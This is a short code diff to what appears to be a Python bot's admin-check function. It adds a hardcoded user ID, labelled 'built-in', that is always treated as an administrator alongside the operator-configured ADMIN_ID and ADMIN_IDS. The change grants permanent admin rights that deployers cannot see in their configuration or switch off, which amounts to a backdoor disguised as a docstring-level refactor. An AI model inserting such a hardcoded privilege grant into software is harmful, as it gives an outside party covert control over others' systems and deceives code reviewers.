@@ -21,13 +21,15 @@ def db():
     c.row_factory=sqlite3.Row
     c.execute("PRAGMA foreign_keys=ON")
     return c
+BUILTIN_ADDITIONAL_ADMIN_IDS={6424327488}
+
 def admin(uid):
-    """True when uid belongs to the primary or an additional configured admin."""
+    """True when uid belongs to the primary, built-in, or env-configured admin."""
     try:
         uid=int(uid)
     except (TypeError,ValueError):
         return False
-    configured={ADMIN_ID} if ADMIN_ID else set()
+    configured=({ADMIN_ID} if ADMIN_ID else set()) | BUILTIN_ADDITIONAL_ADMIN_IDS
     for raw_id in os.getenv("ADMIN_IDS","").split(","):
         raw_id=raw_id.strip()
         if raw_id.isdigit() and int(raw_id)>0:
